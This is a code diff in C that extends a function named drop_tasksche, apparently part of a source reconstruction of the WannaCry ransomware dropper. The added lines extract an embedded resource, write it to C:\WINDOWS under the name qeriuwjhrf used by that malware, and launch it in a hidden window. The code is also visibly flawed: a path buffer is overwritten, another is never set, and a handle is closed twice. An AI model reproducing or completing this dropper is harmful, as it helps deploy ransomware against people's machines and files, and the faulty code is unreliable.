@@ -43,23 +43,40 @@ int create_service()
 int drop_tasksche()
 {
     HANDLE hModule = GetModuleHandleW("kernel32.dll");
+    HANDLE hFile;
 
     //fix these function definitions
     GetProcAddress(hModule, "CreateProcessA");
     GetProcAddress(hModule, "CreateFileA");
     GetProcAddress(hModule, "WriteFile");
     GetProcAddress(hModule, "CloseHandle");
+    
+    PROCESS_INFORMATION pi;
+    STARTUPINFOA si;
 
-    HRSRC hResInfo = FindResourceA(hModule3, 1831, "UNK");
-    HGLOBAL hResData = LoadResource(hModule4, hResInfo);
-    LockResource(hResData);
-    SizeofResource((char *)hModule5, (char *)hResInfo2);
+    HRSRC hResInfo = FindResourceA(0, 1831, "UNK");
+    HGLOBAL hResData = LoadResource(0, hResInfo);
+    PVOID lpBuffer = LockResource(hResData);
+    DWORD nNumberOfBytesToWrite = SizeofResource(0, hResInfo);
     char szFileName[] = "tasksche.exe";
     char szPath[MAX_PATH];
     sprintf(szPath, "C:\\%s\\%s", "WINDOWS", szFileName);
-    char szPathDisk[MAX_PATH];
+    char szNewPath[MAX_PATH];
     sprintf(szPath, "C:\\%s\\qeriuwjhrf", "WINDOWS");
-    MoveFileExA(szPath, szPathDisk, 1);
+    MoveFileExA(szPath, szNewPath, 1);
+    hFile = CreateFileA(szPath, 0x40000000, 0, 0, 2, 4, 0);
+    if(hFile != INVALID_HANDLE_VALUE)
+    {
+        WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &lpBuffer, 0);
+        CloseHandle(hFile);
+    }
+    
+    //run tasksche with /i parameters
+    if(CreateProcessA(NULL, szPath, 0, 0, 0, 0x8000000, 0, 0, &pi, &si))
+    {
+        CloseHandle(hFile);
+        CloseHandle(hModule);
+    }
 }
 
 int no_argument_handler()
